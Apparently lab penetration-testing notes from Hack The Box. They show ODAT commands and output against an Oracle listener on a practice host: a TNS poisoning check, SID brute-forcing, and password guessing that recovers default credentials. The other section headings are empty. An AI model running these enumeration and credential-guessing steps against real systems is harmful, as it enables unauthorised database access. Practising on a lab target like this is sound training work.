## Oracle
```
./odat.py all -s 10.10.10.82 -p 1521

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Searching valid SIDs
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...                                                                                                                                                    
[+] 'XEXDB' is a valid SID. Continue...                                                                                                                                                 
100% |#################################################################################################################################################################| Time: 00:08:27
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |#################################################################################################################################################################| Time: 00:00:15
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue...                                                                                                                                                    
100% |#################################################################################################################################################################| Time: 00:07:05
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB

[3] (10.10.10.82:1521): Searching valid accounts on the XE SID
The login ABM has already been tested at least once. What do you want to do:                                                                                           | ETA:  --:--:--
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
c
100% |#################################################################################################################################################################| Time: 00:31:14
[-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-file accounts/logins.txt accounts/pwds.txt'
root@kali

```

```
root@kali:~/HTB/tools/db/odat# ./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
The login ABM has already been tested at least once. What do you want to do:                                                                                           | ETA:  --:--:--
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
c
[+] Valid credentials found: scott/tiger. Continue...                                                                                                                                   
100% |#################################################################################################################################################################| Time: 00:53:55
[+] Accounts found on 10.10.10.82:1521/XE:
scott/tiger

```
## SMB

## SNMP

## SMTP

## Databases

## Other
